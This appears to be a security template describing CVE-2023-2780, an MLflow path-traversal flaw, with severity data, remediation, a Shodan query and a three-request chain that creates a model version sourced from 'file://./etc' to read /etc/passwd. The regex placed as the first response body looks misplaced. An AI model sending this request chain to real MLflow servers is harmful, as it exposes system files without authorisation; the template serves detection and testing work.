id: CVE-2023-2780
info:
  name: Mlflow <2.3.1 - Local File Inclusion Bypass
  author: iamnoooob,pdresearch
  description: 'Path Traversal: ''\..\filename'' in GitHub repository mlflow/mlflow
    prior to 2.3.1.

    '
  severity: critical
  impact: 'Successful exploitation could allow an attacker to read sensitive files
    on the server.

    '
  remediation: 'Upgrade Mlflow to version 2.3.1 or later to mitigate the vulnerability.

    '
  reference:
  - https://huntr.dev/bounties/b12b0073-0bb0-4bd1-8fc2-ec7f17fd7689/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-2780
  - https://github.com/mlflow/mlflow/commit/fae77a525dd908c56d6204a4cef1c1c75b4e9857
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-2780
    cwe-id: CWE-29
    epss-score: 0.0217
    epss-percentile: 0.88199
    cpe: cpe:2.3:a:lfprojects:mlflow:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: lfprojects
    product: mlflow
    shodan-query: http.title:"mlflow"
  tags: cve2023,cve,mlflow,oss,lfi,huntr,intrusive,lfprojects
traps:
- request:
    method: POST
    path: /ajax-api/2.0/mlflow/registered-models/create
    headers:
      Content-Type: application/json; charset=utf-8
    body: '{"name":"{{randstr}}"}

      '
  response:
    status_code: 200
    headers: {}
    body: 'root:.*:0:0:'
- request:
    method: POST
    path: /ajax-api/2.0/mlflow/model-versions/create
    headers:
      Content-Type: application/json; charset=utf-8
    body: '{"name":"{{randstr}}","source":"file://./etc"}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /model-versions/get-artifact?path=passwd&name=&version=
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
